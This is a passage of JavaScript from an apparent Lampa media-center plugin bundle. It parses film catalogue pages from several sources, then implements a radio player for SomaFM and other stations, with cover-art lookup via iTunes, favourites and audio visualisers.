  				Lampa.Activity.backward();
  			} else {
  				Lampa.Controller.toggle('head');
  			}
  		});
  		body.prepend(more);
  	};
  	this.card = function (str) {
  		var card = [];
  		var page;
  		if (object.sourc != 'pub') str = str.replace(/\\n/g, '');
  		if (object.card && object.card.source == 'rezka' || object.sourc == 'rezka') {
  			var h = $('.b-content__inline_item', str).length ? $('.b-content__inline_item', str) : $('.b-content__collections_item', str);
  			total_pages = $('.b-navigation', str).find('a:last-child').length;
  			page = $('.b-navigation', str).find('a:last-child').attr('href');
  			$(h).each(function (i, html) {
  				card.push({
  					id: $('a', html).attr('href').split('-')[0].split('/').pop(),
  					title: $('a:eq(1)', html).text().split(' / ').shift() || $('.title', html).text(),
  					title_org: $('a:eq(1)', html).text().split(' / ').shift(),
  					url: $('a', html).attr('href'),
  					img: $('img', html).attr('src'),
  					quantity: $('.num', html).text() + ' видео',
  					year: $('div:eq(2)', html).text().split(' - ').shift()
  				});
  			});
  		} else if (object.card && object.card.source == 'filmix' || object.sourc == 'filmix') {
  			var d = $('.playlist-articles', str);
  			var str = d.length ? d.html() : $('.m-list-movie', str).html();
  			$(str).each(function (i, html) {
  				if (html.tagName == 'DIV') {
  					page = $(html).find('.next').attr('href');
  					total_pages = $(html).find('a:last-child').length;
  				}
  				if (html.tagName == 'ARTICLE') card.push({
  					id: $('a', html).attr('href').split('-')[0].split('/').pop(),
  					title: $('.m-movie-title', html).text() || ($('.poster', html).attr('alt') && $('.poster', html).attr('alt').split(',').shift()),
  					title_org: $('.m-movie-original', html).text() || $('.origin-name', html).text(),
  					url: $('a', html).attr('href'),
  					img: $('img', html).attr('src'),
  					quantity: $('.m-movie-quantity', html).text() || $('.count', html).text(),
  					year: $('.grid-item', html).text() || ($('.poster', html).attr('alt') && $('.poster', html).attr('alt').split(',').pop())
  				});
  			});
  		} else if (object.card && object.card.source == 'pub' || object.sourc == 'pub') {
  			str = JSON.parse(str);
  			if (str.pagination) {
  				total_pages = str.pagination.total + 1;
  				page = str.pagination.current + 1;
  			}
  			if (str.items) str.items.forEach(function (element) {
  				card.push({
  					url: element.id,
  					id: element.id,
  					watch: element.views + '/' + element.watchers,
  					title: element.title.split('/')[0],
  					original_title: element.title.split('/')[1] || element.title,
  					release_date: (element.year ? element.year + '' : element.years ? element.years[0] + '' : '0000'),
  					first_air_date: element.type && (element.type.match('serial|docuserial|tvshow') ? 'tv' : '') || '',
  					vote_average: element.imdb_rating || 0,
  					img: element.posters.big,
  					year: element.year,
  					years: element.years
  				});
  			});
  		}
  		return {
  			card: card,
  			page: page,
  			total_pages: total_pages
  		};
  	};
  	this.finds = function (element, find) {
  		var finded;
  		var filtred = function filtred(items) {
  			for (var i = 0; i < items.length; i++) {
  				var item = items[i];
  				if ((element.title_org == (item.original_title || item.original_name) || element.title == (item.title || item.name)) && (item.first_air_date || item.release_date) && parseInt(element.year) == (item.first_air_date || item.release_date).split('-').shift()) {
  					finded = item;
  					break;
  				}
  			}
  		};
  		if (find.movie && find.movie.results.length) filtred(find.movie.results);
  		if (find.tv && find.tv.results.length && !finded) filtred(find.tv.results);
  		return finded;
  	};
  	this.start = function () {
  		Lampa.Controller.add('content', {
  			toggle: function toggle() {
  				Lampa.Controller.collectionSet(scroll.render(), info);
  				Lampa.Controller.collectionFocus(last || false, scroll.render());
  			},
  			left: function left() {
  				if (Navigator.canmove('left')) Navigator.move('left');
  				else Lampa.Controller.toggle('menu');
  			},
  			right: function right() {
  				Navigator.move('right');
  			},
  			up: function up() {
  				if (Navigator.canmove('up')) Navigator.move('up');
  				else Lampa.Controller.toggle('head');
  			},
  			down: function down() {
  				if (Navigator.canmove('down')) Navigator.move('down');
  			},
  			back: function back() {
  				Lampa.Activity.backward();
  			}
  		});
  		Lampa.Controller.toggle('content');
  	};
  	this.pause = function () {};
  	this.stop = function () {};
  	this.render = function () {
  		return html;
  	};
  	this.destroy = function () {
  		network.clear();
  		Lampa.Arrays.destroy(items);
  		scroll.destroy();
  		html.remove();
  		body.remove();
  		network = null;
  		items = null;
  		html = null;
  		body = null;
  		info = null;
  	};
  }
	
// SomaFM, fmplay - Radio plugin for Lampa by @tsynik & @usmanec
// https://somafm.com/channels.json
// https://github.com/rainner/soma-fm-player
// https://codeberg.org/cuschk/somafm


  function _classCallCheck(a, n) {
    if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function");
  }
  function _defineProperties(e, r) {
    for (var t = 0; t < r.length; t++) {
      var o = r[t];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o);
    }
  }
  function _createClass(e, r, t) {
    return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", {
      writable: !1
    }), e;
  }
  function _defineProperty(e, r, t) {
    return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, {
      value: t,
      enumerable: !0,
      configurable: !0,
      writable: !0
    }) : e[r] = t, e;
  }
  function _toPrimitive(t, r) {
    if ("object" != typeof t || !t) return t;
    var e = t[Symbol.toPrimitive];
    if (void 0 !== e) {
      var i = e.call(t, r || "default");
      if ("object" != typeof i) return i;
      throw new TypeError("@@toPrimitive must return a primitive value.");
    }
    return ("string" === r ? String : Number)(t);
  }
  function _toPropertyKey(t) {
    var i = _toPrimitive(t, "string");
    return "symbol" == typeof i ? i : i + "";
  }


  var SwipeDetector = function() {
    function SwipeDetector(options) {
      _classCallCheck(this, SwipeDetector);

      this.targetElement = options.element;
      this.onSwipeLeft = options.onSwipeLeft;
      this.onSwipeRight = options.onSwipeRight;
      this.onSwipeUp = options.onSwipeUp;
      this.onSwipeDown = options.onSwipeDown;
      this.onLongPress = options.onLongPress;

      this.initialX = null;
      this.initialY = null;
      this.currentX = null;
      this.currentY = null;
      this.xDiff = null;  
      this.yDiff = null;
      this.active = false;
      this.longPressTimeout = null;
      this.swiped = false;
      this.preventTextSelection = false; // Новое свойство

      this.targetElement.addEventListener('touchstart', this.startTouch.bind(this), false);
      this.targetElement.addEventListener('touchmove', this.moveTouch.bind(this), false);
      this.targetElement.addEventListener('touchend', this.endTouch.bind(this), false);
    }

    _createClass(SwipeDetector, [{
      key: "startTouch",
      value: function startTouch(event) {
        this.active = true;
        this.initialX = event.touches[0].clientX;
        this.initialY = event.touches[0].clientY;
        this.startLongPress();
        this.swiped = false;
      }
    }, {
      key: "moveTouch",
      value: function moveTouch(event) {
        if (!this.active) return;

        this.currentX = event.touches[0].clientX;
        this.currentY = event.touches[0].clientY;

        this.xDiff = this.initialX - this.currentX;
        this.yDiff = this.initialY - this.currentY;

        if (Math.abs(this.xDiff) > Math.abs(this.yDiff)) {
          if (this.xDiff > 0 && !this.swiped) {
            this.onSwipeLeft();
            this.swiped = true;
          } else if (!this.swiped) {
            this.onSwipeRight();
            this.swiped = true;
          }
        } else {
          if (this.yDiff > 0 && !this.swiped) {
            this.onSwipeUp();
            this.swiped = true;
          } else if (!this.swiped) {
            this.onSwipeDown();
            this.swiped = true;
          }
        }

        this.initialX = this.currentX;
        this.initialY = this.currentY;
        this.endLongPress();
      }
    }, {
      key: "endTouch",
      value: function endTouch() {
        this.active = false;
        this.endLongPress();
        this.swiped = false;
        this.preventTextSelection = false; // Сбрасываем флаг
      }
    }, {
      key: "startLongPress",
      value: function startLongPress() {
        var _this = this;
        this.longPressTimeout = setTimeout(function() {
          if (_this.onLongPress) {
            _this.onLongPress();
          }
          _this.originalUserSelect = _this.targetElement.style.userSelect; // Сохраняем исходное значение
          _this.originalWebkitUserSelect = _this.targetElement.style.WebkitUserSelect; // Сохраняем исходное значение
          _this.targetElement.style.userSelect = 'none'; // Запрещаем выделение текста
          _this.targetElement.style.WebkitUserSelect = 'none'; // Запрещаем выделение текста в Safari
        }, 500); // Adjust the delay as needed
      }
    }, {
      key: "endLongPress",
      value: function endLongPress() {
        clearTimeout(this.longPressTimeout);
        if (this.preventTextSelection) {
          // Разрешаем выделение текста
          this.preventTextSelection = false;
        }
      }
    }]);
    return SwipeDetector;
  }();

  var IMG_BG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAADUlEQVR42gECAP3/AAAAAgABUyucMAAAAABJRU5ErkJggg=='; // black
  var curPlayID = null;
  var played = false;
  var info;
  var useAAC = Lampa.Storage.field('modssfm_use_aac');
  var PREFERRED_STREAMS = (useAAC) ? [
    // 320k MP3
    { urlRegex: /320\.pls$/, format: 'mp3' },
    // 256k MP3
    { urlRegex: /256\.pls$/, format: 'mp3' },
    // 128k AAC
    { quality: 'highest', format: 'aac' },
    // 128k MP3
    { quality: 'highest', format: 'mp3' },
    // 64k AAC
    { quality: 'high', format: 'aacp' },
    // 32k AAC
    { quality: 'low', format: 'aacp' }
  ] : [
    // 320k MP3
    { urlRegex: /320\.pls$/, format: 'mp3' },
    // 256k MP3
    { urlRegex: /256\.pls$/, format: 'mp3' },
    // 128k MP3
    { quality: 'highest', format: 'mp3' }
  ];

  var powtwo = 1024; // power of 2 value
  var _context = null;
  var _audio = null;
  var _source = null;
  var _freq = new Uint8Array(powtwo);
  var _gain = null;
  var _analyser = null;
  var _events = {};
  var _component;
  var audioErr;

  var anf = null;
  var isInitialized = false;

  // setup audio routing, called after user interaction, setup once
  function setupAudio() {
  if (_audio && _context) return;
  if (typeof Audio !== 'undefined') {
    _audio = new Audio();

    try {
      _context = new (window.AudioContext || window.webkitAudioContext)();
    } catch (error) {
      console.error('Modss', 'Ошибка при создании AudioContext:', error);
    }

    if (_audio && _context && typeof _context.createMediaElementSource === 'function') {
      _source = _context.createMediaElementSource(_audio);
      _analyser = _context.createAnalyser();
      _gain = _context.createGain();
      var fftVal = Math.min(32768, Math.max(32, powtwo || 1024));
      _analyser.fftSize = fftVal;
      _source.connect(_analyser);
      _source.connect(_gain);
      _gain.connect(_context.destination);
      _audio.addEventListener('canplay', function (e) {
        if (!_audio) return;
        console.log('Modss_Radio', 'got canplay');
        _freq = new Uint8Array(_analyser.frequencyBinCount);
        _audio.play();
      });
      // https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio#events
      ['play', 'pause', 'waiting', 'playing', 'timeupdate', 'ended', 'stalled', 'suspend'].forEach(function (event) {
        _audio.addEventListener(event, function (e) {
          return emit(event, e);
        });
      });
    } else {
      console.error('Modss', 'Audio API не поддерживается в этом браузере');
    }
  } else {
    console.error('Modss', 'Audio API не поддерживается в этом браузере');
  }
}

  // emit saved audio event
  function emit(event, data) {
    if (!_events || !event || !_events.hasOwnProperty(event)) return;
    _events[event].map(function (fn) { fn(data) });
  }
  // add event listeners to the audio api
  function on(event, callback) {
    if (!_events) _events = {};
    if (event && typeof callback === 'function') {
      if (!_events[event]) _events[event] = [];
      _events[event].push(callback);
    }
  }


  var isSupportWebp = function () {
    var elem = document.createElement('canvas');
    var support = false;
    if (!!(elem.getContext && elem.getContext('2d'))) {
      // was able or not to get WebP representation
      support = elem.toDataURL('image/webp').indexOf('data:image/webp') === 0;
    }
    isSupportWebp = function () {
      return support;
    }
    return isSupportWebp();
  }

  var levenshtein = (function () {
    function _min(d0, d1, d2, bx, ay) {
      return d0 < d1 || d2 < d1
        ? d0 > d2
          ? d2 + 1
          : d0 + 1
        : bx === ay
          ? d1
          : d1 + 1;
    }

    return function (a, b) {
      if (a === b) {
        return 0;
      }

      if (a.length > b.length) {
        var tmp = a;
        a = b;
        b = tmp;
      }

      var la = a.length;
      var lb = b.length;

      while (la > 0 && (a.charCodeAt(la - 1) === b.charCodeAt(lb - 1))) {
        la--;
        lb--;
      }

      var offset = 0;

      while (offset < la && (a.charCodeAt(offset) === b.charCodeAt(offset))) {
        offset++;
      }

      la -= offset;
      lb -= offset;

      if (la === 0 || lb < 3) {
        return lb;
      }

      var x = 0;
      var y;
      var d0;
      var d1;
      var d2;
      var d3;
      var dd;
      var dy;
      var ay;
      var bx0;
      var bx1;
      var bx2;
      var bx3;

      var vector = [];

      for (y = 0; y < la; y++) {
        vector.push(y + 1);
        vector.push(a.charCodeAt(offset + y));
      }

      var len = vector.length - 1;

      for (; x < lb - 3;) {
        bx0 = b.charCodeAt(offset + (d0 = x));
        bx1 = b.charCodeAt(offset + (d1 = x + 1));
        bx2 = b.charCodeAt(offset + (d2 = x + 2));
        bx3 = b.charCodeAt(offset + (d3 = x + 3));
        dd = (x += 4);
        for (y = 0; y < len; y += 2) {
          dy = vector[y];
          ay = vector[y + 1];
          d0 = _min(dy, d0, d1, bx0, ay);
          d1 = _min(d0, d1, d2, bx1, ay);
          d2 = _min(d1, d2, d3, bx2, ay);
          dd = _min(d2, d3, dd, bx3, ay);
          vector[y] = dd;
          d3 = d2;
          d2 = d1;
          d1 = d0;
          d0 = dy;
        }
      }

      for (; x < lb;) {
        bx0 = b.charCodeAt(offset + (d0 = x));
        dd = ++x;
        for (y = 0; y < len; y += 2) {
          dy = vector[y];
          vector[y] = dd = _min(dy, d0, dd, bx0, vector[y + 1]);
          d0 = dy;
        }
      }

      return dd;
    };
  })();
  // https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/Searching.html#//apple_ref/doc/uid/TP40017632-CH5-SW1
  var noCoverTitle = [];
  var albumCoverCache = {};
  function getTrackCover(title, album, callback) {
    if(!album) return;
    var albumHash = Lampa.Utils.hash(album);
    var setTrackCover = callback || function () { };
    if (albumHash && albumCoverCache[albumHash]) {
      setTrackCover(albumCoverCache[albumHash]);
      return;
    }
      
    var regex = /[\s.,{}\-\\\/()\[\]:;'"!@#$%^&*]+/g; // punctuation and spaces
    if (noCoverTitle.indexOf(title) < 0) {
      var request = 'https://itunes.apple.com/search?term=' + encodeURIComponent(title) + '&media=music&entity=song';
      RadioApi.network.native(request, function (data) {
        var bigCover = false;
        if (!data || !data['resultCount'] || !data['results'] || !data['results'].length) {
          if (data !== false) {
            noCoverTitle.push(title);
          }
        }
        var albumLC = album.toLowerCase().replace(regex, "");
        var filtered = data['results'].filter(function (r) {
          r.collectionNameLC = r.collectionName ? r.collectionName.toLowerCase()
            .replace(regex, "") : '';
          return r.collectionNameLC && (r.collectionNameLC.indexOf(albumLC) >= 0 || albumLC.indexOf(r.collectionNameLC) >= 0);
        });
        // console.log('SomaFM', 'getTrackCover request:', request, 'data resultCount', data['resultCount'], "filtered", filtered.length);
        if (!filtered.length) {
          var accuracyPercent = 60; // Допустимая погрешность %
          var accuracyMaxLen = albumLC.length * accuracyPercent / 100;
          filtered = data['results'].filter(function (r) {
            r.levenshtein = levenshtein(r.collectionNameLC, albumLC);
            return r.levenshtein <= accuracyMaxLen;
          })
            .sort(function (a, b) {
              return a.levenshtein - b.levenshtein
            });
          // if (filtered.length)
          //   console.log('SomaFM', 'getTrackCover levenshtein:', '"' + albumLC + '"', 'accuracyPercent', accuracyPercent, "filtered", filtered.length, "min", filtered[0].levenshtein, "max", filtered[filtered.length - 1].levenshtein)
          // else
          //   console.log('SomaFM', 'getTrackCover levenshtein:', '"' + albumLC + '"', 'accuracyPercent', accuracyPercent, "filtered", 0);
        }
        if (!filtered.length || !filtered[0]['artworkUrl100']) {
          noCoverTitle.push(title);
        } else {
          bigCover = filtered[0]['artworkUrl100'].replace('100x100bb.jpg', '500x500bb.jpg'); // увеличиваем разрешение
          albumCoverCache[albumHash] = bigCover;
        }
        setTrackCover(bigCover)
      }, function () {
        setTrackCover(false)
      });
    } else {
      setTrackCover(false);
    }
  }


  var RadioApi = /*#__PURE__*/function () {
    function RadioApi() {
      _classCallCheck(this, RadioApi);
    }
    return _createClass(RadioApi, null, [{
      key: "list",
      value: function list(obj) {
        var _this = this;
        return new Promise(function (resolve, reject) {
          var url = obj.url == '' && _this.stantion()[0].url || obj.url;
          var cacheName = 'radio_list_' + (obj.url == '' && _this.stantion()[0].title || obj.title);
          //console.log('Api', 'GET', {obj, url,cacheName})
          _this.network["native"](url, function (result) {
            Lampa.Cache.rewriteData('other', cacheName, result)["finally"](resolve.bind(resolve, result));
          }, function () {
            Lampa.Cache.getData('other', cacheName).then(resolve)["catch"](reject);
          });
        });
      }
    }, {
      key: "stantion",
      value: function stantion() {
        return [{
          title: 'Modss FM',
          url: 'http://lampa.stream/stantions.json',
          id: 4
        }, {
          title: 'Record FM',
          url: this.CORS + 'https://www.radiorecord.ru/api/stations/',
          id: 1
        },{
          title: 'Soma FM',
          url: 'https://somafm.com/channels.json',
          id: 2
        },{
          title: 'FM PLAY',
          url: this.CORS + 'https://fmplay.ru/stations.json',
          id: 3
        }]
      }
    }]);
  }();

  _defineProperty(RadioApi, "network", new Lampa.Reguest());
  _defineProperty(RadioApi, "CORS", 'https://cors.lampa.stream/');

  var RadioFavorites = /*#__PURE__*/function () {
    function RadioFavorites() {
      _classCallCheck(this, RadioFavorites);
    }
    return _createClass(RadioFavorites, null, [{
      key: "get",
      value: function get() {
        var all = Lampa.Storage.get('radio_favorite_stations', '[]');
        all.sort(function (a, b) {
          return a.added > b.added ? -1 : a.added < b.added ? 1 : 0;
        });
        return all;
      }
    }, {
      key: "find",
      value: function find(favorite) {
        return this.get().find(function (a) {
          return a.id == favorite.id;
        });
      }
    }, {
      key: "remove",
      value: function remove(favorite) {
        var list = this.get();
        var find = this.find(favorite);
        if (find) {
          Lampa.Arrays.remove(list, find);
          Lampa.Storage.set('radio_favorite_stations', list);
        }
      }
    }, {
      key: "add",
      value: function add(favorite) {
        var list = this.get();
        var find = this.find(favorite);
        if (!find) {
          Lampa.Arrays.extend(favorite, {
            id: Lampa.Utils.uid(),
            added: Date.now()
          });
          list.push(favorite);
          Lampa.Storage.set('radio_favorite_stations', list);
        }
      }
    }, {
      key: "update",
      value: function update(favorite) {
        var list = this.get();
        var find = this.find(favorite);
        if (find) {
          Lampa.Storage.set('radio_favorite_stations', list);
        }
      }
    }, {
      key: "toggle",
      value: function toggle(favorite) {
        return this.find(favorite) ? this.remove(favorite) : this.add(favorite);
      }
    }]);
  }();


  function Info(station, Player) {
    var _this = this;
    var info_html = Lampa.Template.js('modss_radio_player');
    var showAnalyzer = Lampa.Storage.field('modssfm_show_analyzer');
    var currTrack = {};
    var img_elm;
    var songsupdate;
    var songId = 0;
    var getNewSong = true;

    if (songsupdate) {
      clearInterval(songsupdate);
      songsupdate = null;
    }

    on("playing", function () {
      Player.changeWave('play', info_html);
    });
    on("waiting", function () {
      Player.changeWave('loading', info_html);
    });

    this.create = function () {
      var cover = Lampa.Template.js('modss_radio_cover');
      cover.find('.m-radio-cover__station').text(station.title || station.name || '');
      cover.find('.m-radio-cover__genre').text(station.genres || '');
      cover.find('.m-radio-cover__tooltip').text(station.description || station.tooltip || '');
      cover.find('.m-radio-cover__album span').text(station.dj ? 'DJ – ' + station.dj : '');

      cover.find('.m-radio-cover__img-container').addClass('focus');
      
      var img_box = cover.find('.m-radio-cover__img-box');
      img_box.removeClass('loaded loaded-icon');

      img_elm = img_box.find('img');
      img_elm.onload = function () {
        img_box.addClass('loaded');
      };
      img_elm.onerror = function () {
        img_elm.src = './img/icons/menu/movie.svg';
        img_box.addClass('loaded-icon');
      };
      img_elm.src = station.largeimage || station.image || station.bg_image_mobile || station.picture; // image - 120 | largeimage - 256 | xlimage 512

      info_html.find('.m-radio-player__cover').html(cover);
      info_html.find('.m-radio-player__close').on('click', function () {
        window.history.back();
      });

      document.body.append(info_html);

      this.start(info_html);
      if(showAnalyzer !== 'hide' && !isInitialized) this.visualisation();
      this.update_info();
    };
    this.update = function (station) {
      var cover = $('.m-radio-player');
      cover.find('.m-radio-cover__station').text(station.title || station.name || '');
      cover.find('.m-radio-cover__genre').text(station.genres || '');
      cover.find('.m-radio-cover__tooltip').text(station.description || station.tooltip || '');
      cover.find('.m-radio-cover__album span').text(station.dj ? 'DJ – ' + station.dj : '');

      cover.find('.m-radio-cover__img-container').addClass('focus');
      
      var img_box = cover.find('.m-radio-cover__img-box');
      img_box.removeClass('loaded loaded-icon');

      img_elm = img_box.find('img')[0];
      img_elm.onload = function () {
        img_box.addClass('loaded');
      };
      img_elm.onerror = function () {
        img_elm.src = './img/icons/menu/movie.svg';
        img_box.addClass('loaded-icon');
      };
      img_elm.src = station.largeimage || station.image || station.bg_image_mobile || station.picture; // image - 120 | largeimage - 256 | xlimage 512

      this.update_info();
    };
    this.update_info = function () {
      var setTrackCover = function setTrackCover(cover) {
        img_elm.src = cover || station.largeimage || station.image || station.bg_image; // image - 120 | largeimage - 256 | xlimage 512
        Lampa.Background.immediately(img_elm.src);
      }

      var updatePlayingInfo = function updatePlayingInfo(playingTrack) {
        var fetchCovers = Lampa.Storage.field('modssfm_fetch_covers');

        if (playingTrack.title) info_html.find('.m-radio-cover__title').text(playingTrack.title);

        // TODO: use playlist for lastSongs
        // info_html.find('.m-radio-cover__playlist').text(playlist);

        var album_cont = info_html.find('.m-radio-cover__album');
        var album_info = album_cont.find('span').text(playingTrack.album || '');
        var album_svg = album_cont.find('svg');
        playingTrack.album ? album_svg.style.width = "1em" : album_svg.style.width = "0em";
        info_html.find('.m-radio-cover__title').text(playingTrack.title || '');
        info_html.find('.m-radio-cover__tooltip').text(playingTrack.artist || playingTrack.tooltip || '');

        var coverKey = isSupportWebp() ? 'cover_webp' : 'cover';
        var img = playingTrack[coverKey] ? playingTrack.root + playingTrack[coverKey] : ''

        var albumart = playingTrack.albumart || img;
        if (albumart) setTrackCover(albumart);
        else if (fetchCovers) getTrackCover(playingTrack.artist + " - " + playingTrack.title, playingTrack.album, setTrackCover);
      }

      var fetchSongs = function fetchSongs(channel, callback) {
        var apiurl = channel.songsurl || '';
        var title = channel.title || '...';
        var error = 'There was a problem loading the list of songs for channel ' + title + ' from SomaFM.';
    
        RadioApi.network.timeout(5000)
        RadioApi.network.native(apiurl, function (result) {
          if (!result.songs) return callback(error, []);
          return callback(null, result.songs);
        }, function () {
          return callback(error, [])
        });
      }

      if (songsupdate) {
        clearInterval(songsupdate);
        songsupdate = null;
      }

      if(_component._object.id == 2) {
        // get songs list for a channel from api
        _this.getSongs = function getSongs(channel) {
          if (!channel || !channel.id || !channel.songsurl) return;

          fetchSongs(channel, function (err, songs) {
            var size = Object.keys(songs).length;
            if (!err && size > 0 && (!currTrack.date || (songs[0].date && currTrack.date !== songs[0].date))) {
              currTrack = songs.shift();
              updatePlayingInfo(currTrack);
            }
          });
        }
      } else if(_component._object.id == 3) {
        // get songs list for a channel from api
        _this.getSongs = function getSongs(channel) {
          if (!channel || !channel.id || !channel.songUrl || !channel.songIdUrl || songId === "000") return;
          var noCache = new Date().getTime();
          if (getNewSong) {
            getNewSong = false;
            RadioApi.network.native(channel.songUrl + '?' + noCache, function(data) {
              if (!data.uniqueid || data.uniqueid == '000') return;
              songId = data.uniqueid;
              currTrack = data;
              updatePlayingInfo(currTrack);
            });
          } else {
            RadioApi.network.native(channel.songIdUrl + '?' + noCache, function(data) {
              if (!data.uniqueid) return;
              getNewSong = songId !== data.uniqueid;
              if (getNewSong) {
                songId = data.uniqueid;
                getSongs(channel);
              }
            });
          }
        }
      }

      if(_this.getSongs) songsupdate = setInterval(function () {
        _this.getSongs(station);
      }, 3000);

    };
      this.visualisation = function () {
        var Visualizer = {
          init: function (analyser) {
            try {
              this._analyser = analyser;
              this._freq = new Uint8Array(analyser.frequencyBinCount);
              this._hasfreq = false;
              this._counter = 0;
            } catch (error) {
              console.error('Modss', 'Modss_Radio', 'Ошибка инициализации визуализатора:', error);
            }
          },
        getFreqData: function (playing) {
          if (!this._analyser) return 0;

          // this is not working on some devices running safari
          this._analyser.getByteFrequencyData(this._freq);
          var freq = Math.floor(this._freq[4] | 0) / 255;

          // indicate that a freq value can be read
          if (!this._hasfreq && freq) this._hasfreq = true;
          // frequency data available
          if (this._hasfreq) return freq;

          // return fake counter if no freq data available (safari workaround)
          if (playing) {
            this._counter = this._counter < 0.6 ? this._counter + 0.01 : this._counter;
          } else {
            this._counter = this._counter > 0 ? this._counter - 0.01 : this._counter;
          }
          return this._counter;
        },
        visualizeBarGraph: function (played) {
          var canvas = info_html.find("canvas");
          canvas.width = window.innerWidth;
          canvas.height = window.innerHeight;
          var ctx = canvas.getContext("2d");

          var bufferLength = this._analyser.frequencyBinCount;
          var WIDTH = canvas.width;
          var HEIGHT = canvas.height;
          var barWidth = (WIDTH / bufferLength) * 2.5;
          var barHeight;
          var x = 0;

          var renderFrame = function renderFrame () {
            // get data
            var freq = this.getFreqData(played);
            // clear draw
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            x = 0;
            for (var i = 0; i < bufferLength; i++) {
              barHeight = this._freq[i] * 2;
              var r = 255;
              var g = 255;
              var b = 255;
              var opacity = this._freq[i] / 510; // 0 to 0.5, data = [0 to 255]
              ctx.fillStyle = "rgba(" + r + "," + g + "," + b + "," + opacity + ")";
              ctx.fillRect(x, HEIGHT - barHeight, barWidth, barHeight);
              x += barWidth + 4;
            }
            anf = requestAnimationFrame(renderFrame.bind(this));
          }
          renderFrame.call(this);
        },
        visualizeGraphics: function (played) {
          var that = this;
          var graphicsManager = {
            _wrap: null,
            _canvas: null,
            _renderer: null,
            _scene: null,
            _camera: null,
            _box: null,
            _mouse: {
              x: 0,
              y: 0
            },
            _objects: [],
            Sphere: {
              group: null,
              shapes: [],
              move: new THREE.Vector3(0, 0, 0),
              touch: false,
              ease: 8,
              create: function (containerBounds, scene) {
                this.group = new THREE.Object3D();
    
                var smallCircleGeometry = new THREE.CircleGeometry(1, 10);
                var largeCircleGeometry = new THREE.CircleGeometry(2, 20);
                var sphereGeometry = new THREE.SphereGeometry(100, 30, 14).vertices;
                var material = new THREE.MeshNormalMaterial({
                  transparent: true,
                  opacity: 0,
                  side: THREE.DoubleSide
                });
    
                for (var i = 0; i < sphereGeometry.length; i++) {
                  var sphereGeometryItem = sphereGeometry[i];
                  var x = sphereGeometryItem.x;
                  var y = sphereGeometryItem.y;
                  var z = sphereGeometryItem.z;
                  var homePosition = {
                    x: x,
                    y: y,
                    z: z
                  };
                  var startCycle = THREE.Math.randInt(0, 100);
                  var cyclePace = THREE.Math.randInt(10, 30);
                  var mesh = new THREE.Mesh(i % 2 ? smallCircleGeometry : largeCircleGeometry, material);
    
                  mesh.position.set(x, y, z);
                  mesh.lookAt(new THREE.Vector3(0, 0, 0));
                  mesh.userData = {
                    radius: 12,
                    cycle: startCycle,
                    pace: cyclePace,
                    home: homePosition
                  };
    
                  this.group.add(mesh);
                }
    
                this.touch = "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0;
                this.group.position.set(40, 5, 0);
                this.group.rotation.x = Math.PI / 2 + 0.6;
                scene.add(this.group);
              },
              update: function (containerBounds, mousePosition, audioData) {
                var xOffset = containerBounds.width < 800 ? 0 : 40;
                var zOffset = containerBounds.width < 800 ? -60 : 20;
                var zMultiplier = 0.5 + 0.5 * audioData;
    
                if (this.touch) {
                  this.group.position.x = xOffset;
                } else {
                  this.move.x = xOffset + -0.012 * mousePosition.x;
                  this.group.position.x += (this.move.x - this.group.position.x) / this.ease;
                  this.group.position.y += (this.move.y - this.group.position.y) / this.ease;
                }
    
                this.group.position.z = zOffset + 80 * audioData;
                this.group.rotation.y -= 0.003;
    
                for (var i = 0; i < this.group.children.length; i++) {
                  var mesh = this.group.children[i];
                  var radius = mesh.userData.radius;
                  var cycle = mesh.userData.cycle;
                  var pace = mesh.userData.pace;
                  var home = mesh.userData.home;
                  mesh.material.opacity = 0.2 + 0.8 * audioData;
                  mesh.position.set(home.x, home.y, home.z);
                  mesh.translateZ(zMultiplier * Math.sin(cycle / pace) * radius);
                  mesh.userData.cycle++;
                }
              }
            },
            setupCanvas: function () {
              this._wrap = document.querySelector(".m-radio-player");
              this._canvas = document.querySelector("#player-canvas");
              this._box = this._wrap.getBoundingClientRect();

              this._scene = new THREE.Scene();
              this._renderer = new THREE.WebGLRenderer({
                canvas: this._canvas,
                alpha: true,
                antialias: true,
                precision: "lowp"
              });
              this._renderer.setClearColor(0, 0);
              this._renderer.setPixelRatio(window.devicePixelRatio);

              this._camera = new THREE.PerspectiveCamera(60, this._box.width / this._box.height, 0.1, 20000);
              this._camera.lookAt(this._scene.position);
              this._camera.position.set(0, 0, 300);
              this._camera.rotation.set(0, 0, 0);

              this._objects.push(this.Sphere);

              // Создаем объекты для сцены
              for (var i = 0; i < this._objects.length; i++) {
                this._objects[i].create(this._box, this._scene);
              }

              // Добавляем обработчики событий
              window.addEventListener("mousemove", this.updateMouse.bind(this));
              window.addEventListener("resize", this.updateSize.bind(this));

              this.updateMouse();
              this.updateSize();
              isInitialized = true;
            },
            animate: function () {
              anf = requestAnimationFrame(this.animate.bind(this));
              this.updateObjects(that.getFreqData(played));
            },
            updateObjects: function (freqData) {
              // Обновляем графические объекты на основе частотных данных
              for (var i = 0; i < this._objects.length; i++) {
                this._objects[i].update(this._box, this._mouse, freqData);
              }
              this._renderer.render(this._scene, this._camera);
            },
            updateSize: function () {
              if (this._wrap && this._canvas) {
                this._box = this._wrap.getBoundingClientRect();
                this._canvas.width = this._box.width;
                this._canvas.height = this._box.height;
                this._camera.aspect = this._box.width / this._box.height;
                this._camera.updateProjectionMatrix();
                this._renderer.setSize(this._box.width, this._box.height);
              }
            },
            updateMouse: function (event) {
              if (this._box) {
                var centerX = this._box.left + this._box.width / 2;
                var centerY = this._box.top + this._box.height / 2;

                if (event) {
                  this._mouse.x = Math.max(0, event.pageX || event.clientX || 0) - centerX;
                  this._mouse.y = Math.max(0, event.pageY || event.clientY || 0) - centerY;
                } else {
                  this._mouse.x = centerX;
                  this._mouse.y = centerY;
                }
              }
            }
          };

          graphicsManager.setupCanvas();
          graphicsManager.animate();
        }
      };

      Visualizer.init(_analyser);
      if (showAnalyzer == 'line') Visualizer.visualizeBarGraph(played);
